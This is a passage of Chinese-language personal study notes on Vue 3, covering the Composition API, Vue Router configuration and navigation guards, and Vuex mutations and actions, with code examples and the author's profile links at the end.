         }
         100%{
             transform: translateX(0);
             opacity: 1;
         }
     }
     @keyframes kerwinanimate2 {
         0%{
             transform: translateX(100px);
             opacity: 0;
         }
         100%{
             transform: translateX(0);
             opacity: 1;
         }
     }
     </style>
     ```

### 6-VCA

- 组合式API：VUE Composition API，最初定义的是函数式API，VUE Function API
- 使用 setup 之后，this就不灵咯

![在这里插入图片描述](https://img-blog.csdnimg.cn/a4601778ca864988a9e63c5c26cfe319.png)

- 组合式的编程思想：把子逻辑拆开，然后导入到主逻辑中return

![在这里插入图片描述](https://img-blog.csdnimg.cn/fabc776d4ef540308d3f88edbcbbbb3e.png)

1. reactive：包装函数，将普通对象包装成响应式对象
   - 因为 `new Proxy(obj)` 中传入的是对象
   - 不支持简单数据的拦截，只能传入对象、数组

2. ref：创建一个包装式对象，含有一个响应属性value
   - 与reactive的差别：前者没有包装属性value
   - `const count = ref(0)`
   - 可以接收普通数据类型，`count.value++`
   - 之前的作用是dom引用，现在是有新的能力。挂载在dom时：`<input type="text" ref="myinput">`
     - js中定义：`const myinput = ref(null)`
     - 获取dom：`myinput.value`
     - 获取dom的值：`myinput.value.value`
   - 其实是进行了一波类似reactive的包装
     - `const myname = ref("kerwin")`
     - 等价于：`new Proxy({value: "kerwin"})`
   - 使用时，不需要 `.value`，自动实现，在dom中直接用 `myname`
   - 在js中需要 `myname.value` 进项赋值等操作，就dom中可以省略
   - **可以用基本类型，也可以用复杂类型**

3. toRefs和toRef
   - toRef：`return {mytext: toRef(status, 'mytext')}` ，把对象中的属性转换为ref对象的格式
   - toRefs：`return {...toRefs(status)}`，也可以实现直接使用对象
   - ref转reactive：直接在对象中加入ref对象：`state = {ref_location}`，直接加进去就行，修改的话，直接用 `ref_location.value = 新值` 或者用 `status.ref_location = 新值`

4. 计算属性 | computed

   - `const computedName = computed(()=>state.datalist.filter(item=>intem.includes(state.mytext)))`
   - `return {computedName}`，则为对应的计算属性
   - computed方法需要导入
   - 自定义的hooks方法用 use 开头，setup中即使数据是异步获取的，依然会调用hooks方法和返回响应式对象

5. watch

   - 计算属性允许我们声明地计算衍生值。然而在有些情况下，我们需要在状态变化时执行一些“副作用”：例如更改DOM，或是根据异步操作的结果去修改另一处的状态。

   - 可以获取新值和旧值

     ```ts
     const anotext = ref("")
     watch(anotext, (newValue, oldValue) => {
         console.log("同步/异步", ": ", newValue, "-", oldValue);
     })
     ```

   - 第二种写法：通过箭头函数来跟踪

     ```ts
     const anotext = ref("")
     watch(()=>anotext.value, (newValue, oldValue) => {
         console.log("同步/异步", ": ", newValue, "-", oldValue);
     })
     ```

   - 监听多个数据源：

     ```ts
     watch([anotext, select], (newValue, oldValue) => {
         console.log("同步/异步", ": ", newValue, "-", oldValue);
     }, {immediate:true, deep:true})
     ```

   - immediate：一开始立即触发一次

   - deep：深度监听

   - 监听reactive中的对象：

     - 直接监听state：缺点是任一对象改变，都会触发
     - 监听getter箭头函数 `()=>state.mytext`

6. watchEffect

   - watch：
     - 具有一定的惰性lazy，第一次页面展示的时候不会执行，只有数据变化的时候才会执行
     - 参数可以拿到当前值和原始值
     - 可以监听多个数据的变化，用一个监听器承载
   - watchEffect
     - 立即执行，没有惰性，页面的首次加载就会执行
     - 自动检测内部代码，代码中有依赖，便会执行
     - 不需要传递要侦听的内容，会自动感知代码依赖，不需要传递很多参数，只要传递一个回调函数
     - 不能获取之前数据的值，只能获取当前值
     - 一些异步的操作放在这里会更加合适

7. prop & emit

   子传父的实现

   ```ts
   props: ["mytitle"], // 正常接收
   setup(props, {emit}){
   	const handleClick = () => {
   		emit('kerwinevent')
   	}
   	
   	return {
   		hanleClicks
   	}
   }
   ```

8. provide & inject

   provide、inject是vue-composition-api 的一个功能：依赖注入功能

   ```js
   import { provide, inject } from 'vue'
   
   // 跟组件共享自己的状态
   const kerwinshow = ref(true)
   provide('kerwinshow', kerwinshow)
   
   // detail组件
   onMounted(() => {
   	const kerwinshow = inject('kerwinshow')
   	kerwinshow.value = false
   })
   ```

9. VCA中的生命周期

   |    原方法     |     升级后      |
   | :-----------: | :-------------: |
   | beforeCreate  |      setup      |
   |    created    |      setup      |
   |  beforeMount  |  onBeforeMount  |
   |    mounted    |    onMounted    |
   | beforeUpdate  | onBeforeUpdate  |
   |    updated    |    onUpdated    |
   | beforeDestroy | onBeforeUnmount |
   |   destroyed   |   onUnmounted   |

   - onBeforeMount：dom创建之前调用
   - onMounted：订阅、ajax，dom创建之后，用于swiper、echarts初始化
   - onBeforeUpdate：更新之前
   - onUpdated：更新之后
   - onUnmounted：清除定时器啥的
   - **nextTick**可以直接从vue中导入，不需要this了，紧随状态的更新

10. setup语法糖

    - 优势：

      - 更少的样本内容，更简洁的代码
      - 能够使用纯TS声明props和自定义事件
      - 更好的运行时性能：其模板会被编译成同一作用域内的渲染函数，避免了渲染上下文代理对象
      - 更好的IDE类型推导性能（减少了语言服务器从代码中抽取类型的工作）

    - toRefs用法：`const {myname, myage} = {..toRefs(state)}`

    - 组件：直接import就行，不需要写components了

    - 父子通信：

      - 原来：`setup(props, {emit}){}`，或者没有setup时的：`props: {}`

      - 现在：

        ```ts
        import {defineProps} from "vue"
        
        const props = defineProps({
        	title: {
        		type: String,
        		default: "1"
        	}
        })
        
        // right为父组件传来的事件名称
        const emit = defineEmits(["right"])
        const handleRight = () => {
            emit("right", "来自子组件的问候")
        }
        ```

    - 动态组件

      - `<component :is="List"></component>`，这里的List直接就是动态组件的变量名，**只能说很强大**
      - 当然，还是可以用以前的方法，弄一个which，比如写一个三目表达式：`<component :is="which?List:Detail"></component>`

    - 指令

      通过v+驼峰写法定义

      ```
      <Navbar v-kerwin v-kerwin-dir></Navbar>
      
      // 局部指令
      const vKerwin = {
          beforeMount: (el) => {
              ...
          }
      }
      // 简写
      const vKerwinDir = (el) => {
      	el.style.background = "yellow"
      }
      ```

### 7-路由

Vue Router 是官方路由，与vue核心深度集成，让用vue构建单页应用变得轻而易举，功能包括：

- 嵌套路由映射
- 动态路由选择
- 模块化、基于组件的路由配置
- 路由参数、查询、通配符
- 展示由vue的过渡系统提供的过渡效果
- 细致的导航控制
- 自动激活css类的链接
- HTML5 history模式或者hash模式
- 可定制的滚动行为
- URL的正确编码

---

1. 路由的基本使用

   - 我的理解：就是把组件写好，配置好路由跟组件之间的关系，然后在App.vue中放入需要显示组件的地方 `router-view` ，这样切换到对应路由的时候，对应的组件就会显示在插槽中

   - 基本感觉就像：`component :is="which"`，这样是儿的。不过把这部分由状态which控制的情况改为了用路由来控制

   - `./App.vue`

     ```vue
     <template>
         <div>
             App
     
             <!-- 路由插槽 -->
             <router-view></router-view>
             <router-view></router-view>
         </div>
     </template>
     ```

   - `./router/index.js`

     ```js
     import {createRouter, createWebHashHistory} from 'vue-router'
     import Films from '../views/Films.vue'
     import Cinemas from '../views/Cinemas.vue'
     import Center from '../views/Center.vue'
     
     const routes = [
         {
             path: "/films",
             component: Films
         },
         {
             path: "/cinemas",
             component: Cinemas
         },
         {
             path: "/center",
             component: Center
         }
     ]
     
     const router = createRouter({
         history: createWebHashHistory(),
         routes, // routes: routes的缩写
     })
     
     export default router
     ```

   - 组件放在：`./views` 里面

2. 路由重定向和别名

   - notfound：

     ```js
     const routes = [
       // pathMatch是参数的名称，例如，要去/not/found
       // { params: { pathMatch: ['not', 'found'] }}
      
       // 最后一个*，它意味着重复的参数，如果您打算使用它的名称直接导航到未找到的路由，那么这是必要的
       { path: '/:pathMatch(.*)*', name: 'not-found', component: NotFound },
      
       // 如果你省略了最后一个' * '，参数中的' / '字符将在解析或推入时被编码
       { path: '/:pathMatch(.*)', name: 'bad-not-found', component: NotFound },
     ]
     ```

   - 取名：name，用于重定向啊啥的找，路由里面不能用

   - 别名：alias，用于不同路由指向同一个东西

   - 例子

     ```js
     import {createRouter, createWebHashHistory} from 'vue-router'
     import Films from '../views/Films.vue'
     import Cinemas from '../views/Cinemas.vue'
     import Center from '../views/Center.vue'
     import NotFound from '../views/NotFound.vue'
     
     const routes = [
     
         // 重定向和起别名
         {
             path: "/",
             // redirect: "/films"
             redirect: {
                 name: "c"
             }
         },
         {
             path: "/films",
             component: Films
         },
         {
             path: "/cinemas",
             component: Cinemas,
             name: "c"
         },
         {
             path: "/center",	
             alias: "/wode",
             component: Center
         },
         // 其他匹配，pathMatch只是占位符，可以随便取名，(.*)*通配符：随便什么符号都行，且重复n次
         {
             path: '/:pathMatch(.*)*', 
             component: NotFound
         },
     ]
     
     const router = createRouter({
         history: createWebHashHistory(),
         routes, // routes: routes的缩写
     })
     
     export default router
     ```

3. 声明式导航

   - 使用 `router-link`来声明导航，` <router-link to="/films">电影</router-link>`

   - 老版本可以传入tag指定渲染的tag，不过已经没用了

   - 新版使用方法：

     ```html
     <router-link to="/films" custom v-slot="{isActive, navigate}">
                     <li :class="isActive" @click="navigate">电影</li>
                 </router-link>
     ```

     - 这里的 `v-slot` 是 [作用域插槽](#slot) ，简单来说就是为了拿到子类的数据，也就是拿到 `isActive` 和 `navigate`。（子组件肯定就是 `:isActive` 和 `:navigate` 把值传递给了父）

     - 这里 `v-slot` 可以简化为 `#` 

       - 具名插槽是 `v-slot:name`，简写是 `#name`

       - 具名作用域插槽是 `v-slot:name=props`，简写是 `#name=props`

       - 所以完全可以知道，普通作用可以简写为 `#=props`

         ```html
         <router-link to="/films" custom #="{isActive, navigate}">
                         <li :class="isActive" @click="navigate">电影</li>
                     </router-link>
         ```

     - `isActive`：路由是否激活，bool

     - `navigate`：跳转函数，绑定点击事件，主要实现路由、组件和url的切换

4. 嵌套路由

   - 通用写法：

     ```js
     const routes = [
     
         // 重定向和起别名
         {
             path: "/",
             // redirect: "/films"
             redirect: {
                 name: "c"
             }
         },
         {
             path: "/films",
             component: Films,
             // redirect: { name: "np" },
             redirect: "/films/nowplaying",
             children: [
                 {
                     path: "/films/nowplaying",
                     component: NowplayingVue,
                     name: "np"
                 },
                 {
                     path: "comingsoon",
                     component: Comingsoon
                 }
             ]
         },
         {
             path: "/cinemas",
             component: Cinemas,
             name: "c"
         },
         {
             path: "/center",
             alias: "/wode",
             component: Center
         },
         // 其他匹配，pathMatch只是占位符，可以随便取名，(.*)*通配符：随便什么符号都行，且重复n次
         {
             path: '/:pathMatch(.*)*',
             component: NotFound
         },
     ]
     ```

   - 这里的子路由的path，也可以写别的，跟主路由其实没有父子关系。只是可读性极差，感官上写成父子关系更易于开发。

   - 如果希望能简写，不要重复写父路由，那么可以不加 `/` ，直接写子路由的名称

   - 如果要写多级重定向，比如：`/` 重定向到 `/films`，`/films` 重定向到 `/films/nowplaying`，不要写name的形式，而是直接写路径

5. 编程式导航，包括param传参和query传参

   - 声明式：`<router-link :to="...">`
   - 编程式：`router.push(...)`
     - 例如：this.\$router.push( \`/detail/\${id} \` )
   - **字符串路径**：`router.push('/users/eduardo')`
   - **带有路径的对象**：`router.push({path: '/users/eduardo'})`
   - **命名的路由，并加上参数**，让路由建立url：`router.push({ name: 'user', params: {username: 'eduardo'} })`
   - **带查询参数**，结果是 `/register?plan=private` ：`router.push({path: '/register', query: {plan: 'private'}})`

6. 动态路由匹配

   你可以在同一个路由中设置有多个 路径参数，它们会映射到  `$route.params` （`$route.query`）上对应的字段，例如：

   |            匹配模式            |         匹配路径         |            $route.params             |
   | :----------------------------: | :----------------------: | :----------------------------------: |
   |        /users/:username        |      /users/eduardo      |        {username: ‘eduardo’}         |
   | /users/:username/posts/:postId | /users/eduardo/posts/123 | {username: ‘eduardo’, postId: ‘123’} |

   - 返回：`this.$router.back()`

   - 前进：`this.$router.forward()`

   - 返回或者前进多级：`this.$router.go(1)`、`this.$router.go(-1)`

   - 在当前页面push路由怎么拿到 路由的 param：通过 **watch**，监听 `$route.params`

     ```js
     watch: {
         "$route.params": function() {
             console.log(this.$route.params.filmId);
         }
     }
     ```

7. 路由模式

   - hash模式：它在内部传递的实际URL之前使用了一个哈希字符#，由于这部分URL从未被发送到服务器，所以它不需要在服务器层面上进行任何特殊处理。不过，它在SEO中确实有不好的影响。如果你担心这个问题，可以使用HTML5模式。
   - 用 `createWebHistory()` 创建HTML5模式，**推荐**使用这个模式：
   - 注意：由于我们的应用是一个单页的客户端应用，如果没有适当的服务器配置，用户在浏览器中直接访问 `https://example.com/user/id`，就会得到一个404错误，这就尴尬了。
   - 要解决这个问题，你需要做的就是：**在服务器上添加一个简单的回路路由，如果URL不匹配任何静态资源，它需要提供与你的应用程序中的index.html相同的页面**。

8. 全局路由拦截

   ```js
   // 全局拦截：前置钩子
   router.beforeEach((to, from, next) => {
       if (to.name !== 'Login' && !isAuthenticated) next({name: 'Login'})
       else next()
   })
   
   // 后置钩子，一般用于收集log，用于分析、更改页面标题、声明页面等辅助功能以及许多其他事情都很有用
   router.afterEach((to, from) => {
       sendToAnalytics(to.fullPath)
   })
   ```

   - meta：路由的属性

     ```js
     {
         path: "/center",
         alias: "/wode",
         component: Center,
             meta: {
             	requiredAuth: true
         	}
     }
     ```

   - **通过给路由设置一个属性，然后再全局拦截里针对这个属性写判断逻辑，实现：多个路由的是否需要验证统一管理。** 

   - 获取meta的属性：`to.meta.requiredAuth`

9. 组件内的守卫

   1. `beforeRouteEnter(to, from){}`

      - 在渲染该组件的对应路由被验证前调用

      - 不能获取组件实例 `this` ，因为当守卫执行时，组件实例还没有被创建

        ```vue
        <script>
            export default {
                async beforeRouteEnter(to, from, next){
                    let isAuthenticated = await localStorage.getItem("token")
        
                    if (isAuthenticated) {
                        next()
                    }else{
                        next({name: "Login"})
                    }
                }
            }
        </script>
        ```

   2. `beforeRouteUpdate(to, from){}`

      - 在当前路由改变，但是该组件被复用时调用

      - 举例来说，对于一个带有动态参数的路径 `/users/:id` ，在 `/users/1` 和 `/users/2` 之间跳转的时候

      - 由于会渲染同样的 `UserDetails` 组件，因此组件实例会被复用。而这个钩子就会在这个情况下被调用。因为在这种情况发生的时候，组件已经挂载好了，导航首位可以访问组件实例 `this`

      - **可以取代watch的功能，开发类似猜你喜欢的逻辑**

        ```js
        beforeRouteUpdate(to, from){
        	console.log("接受猜你喜欢传来的参数", to.params.myid, "带着id参数请求后端接口")
        }
        ```

   3. `beforeRouteLeave(to, from){}`

      - 在导航离开渲染该组件的对应路由时调用

      - 与 `beforeRouteUpdate` 一样，它可以访问组件实例 `this`

        ```js
        beforeRouteLeave(){
        	const answer = window.confirm("你确定要离开吗？")
        	if(!answer) return false
        }
        ```

10. 路由懒加载

    - 当打包构建应用时，js包会变得非常大，影响页面加载，如果我们能把不同路由对应的组件分割成不同的代码块，然后当路由被访问的时候才加载对应的组件，这样就会更加高效。
    - vue router支持开箱即用的 **动态导入**，这意味着你可以用动态导入代替静态导入
    - 在index.js中，将路由中的组件改为：`component: () => import('../views/Cinemas.vue')`

11. VCA与路由

    1. useRouter：跳转

       ```js
       import {useRouter} from 'vue-router'
       const router = useRouter()
       router.push("...")
       ```

    2. useRoute：接收

       ```js
       import {useRoute} from 'vue-router'
       const route = useRoute()
       console.log(route.params.id)
       ```

    3. 组件生命周期

       ```js
       import {onBeforeRouteUpdate, onBeforeRouteLeave} from 'vue-router'
       
       onBeforeRouteUpdate((to, from) => {
           console.log("接收上一个页面传来的参数", to.params.myid, "带着id参数请求后端接口")
       })
       
       onBeforeRouteLeave(() => {
           const answer = windows.confirm("你确定要离开吗？")
           if (!answer) return false
       })
       ```

       注意：组合API和setup函数这种的VCA，只支持 `onBeforeRouteUpdate` 和 `onBeforeRouteLeave` 两个守卫，不能使用 `beforeRouteEnter`

       原因：前置进入的时候，还没有this呢，所以setup里面没写也很正常

       解决：

       - 全局做首位拦截
       - 既写一个setup的script，又写一个普通的script，然后在普通的script中写 `async beforeRouteEnter(to, from, next){...}`
       - 写普通script+setup函数，`beforeRouteEnter` 写在setup外


### 8-vuex

Vuex是一个转为Vue.js应用程序开发的**状态管理模式+库**，它采用集中式存储管理应用和所有组件的状态，并以相应的规则保证状态以一种可预测的方式发生变化。

当我们的应用遇到**多个组件共享状态**时，单向数据流的简洁性很容易被破坏：

- 多个视图依赖同一状态
- 来自不同视图的行为需要变更同一状态

---

1. 引入

   - 作用
     - 页面有多个需要共享的状态，引入vuex，便于维护（非父子通信）
     - 缓存部分异步数据，减少后端服务的访问，增加用户体验
   - 注意：我们应该通过提交 mutation 的方式，而非直接改变 `store.state.count` ，是因为我们想要更明确的追踪到状态的变化。这个简单的约定能够让你的意图更加明显，这样你在阅读代码的时候，能够更容易的读应用内部的状态改变。此外，这样也让我们有机会去实现一些能记录每次状态改变，保存状态快照的调试工具。有了它，我们甚至可以实现如时间穿梭般的调试体验。

2. vuex的基本使用

   ![vuex](https://vuex.vuejs.org/vuex.png)

   1. Mutation

      - 能够在vue-tools插件中的vuex中，看到state状态的修改情况

      - 在vue-tools的timeline的mutations中看到出发的mutations哪些被执行了

      - vuex放在缓存、内存之中，如果刷新后就丢了

      - 项目开发：字符串转变量

        - 在 `store/type.js` 中定义每个页面的mutations函数名

          ```js
          // detail页面
          const CHANGE_TABBAR = "changeTabbar"
          
          
          export {CHANGE_TABBAR}
          ```

        - 在 `store/index.js` 中定义mutations

          ```js
          import {createStore} from 'vuex'
          import { CHANGE_TABBAR } from './type'
          
          const store = createStore({
              state(){
                  return {
                      isTabbarShow: true
                  }
              },
              // 唯一修改状态的位置
              mutations: {
                  // showTabbar(state){
                  //     state.isTabbarShow = true
                  // },
                  // hideTabbar(state){
                  //     state.isTabbarShow = false
                  // },
                  [CHANGE_TABBAR](state, payload){
                      state.isTabbarShow = payload
                  }
              }
          })
          
          export default store
          ```

        - `[变量](){...}`：直接把**变量对应的字符串**作为该函数的名称，后面所有的组件中使用的时候使用的是**该变量**：`this.$store.commit(变量, ...)`

   2. Actions

      - Mutations中只能做同步，不能做异步

      - 要做异步的话，需要通过Actions把数据拿回来，再走mutations

      - 组件调用的时候，直接从store中拿数据

        ```js
        import {createStore} from 'vuex'
        import { CHANGE_TABBAR } from './type'
        
        import axios from 'axios'
        
        const store = createStore({
            state(){
                return {
                    isTabbarShow: true,
                    cinemaList: [],
                }
            },
            // 唯一修改状态的位置
            mutations: {
                [CHANGE_TABBAR](state, payload){
                    state.isTabbarShow = payload
                },
                changeCinemaList(state, payload){
                    state.cinemaList = payload
                }
            },
            // 同步+异步
            actions: {
                async getCinemaList(store){
                    console.log("ajax");
                    var res = await axios({
                        url: "https://m.maizuo.com/gateway?cityId=110100&ticketFlag=1&k=5385023",
                        headers: {
                            "X-Client-Info":
                                '{"a":"3000","ch":"1002","v":"5.2.1","e":"1701324144895711134613505"}',
                            "X-Host": "mall.film-ticket.cinema.list",
                        },
                    })
                    // 提交mutation
                    store.commit("changeCinemaList", res.data.data.cinemas)
                }
            }
        })
        
        export default store
        ```

      - Getter



































---

- ☁️ 我的CSDN：`https://blog.csdn.net/qq_21579045/`
- ❄️ 我的博客园：`https://www.cnblogs.com/lyjun/`
- ☀️ 我的Github：`https://github.com/TinyHandsome/`
- 🌈 我的bilibili：`https://space.bilibili.com/8182822/`
- 🥑 我的思否：`https://segmentfault.com/u/liyj/`
- 🍅 我的知乎：`https://www.zhihu.com/people/lyjun_/`
- 🥔 我的豆瓣：`https://www.douban.com/people/lyjun_/`
- 🐧 粉丝交流群：1060163543，神秘暗号：为干饭而来

碌碌谋生，谋其所爱。🌊              @李英俊小朋友
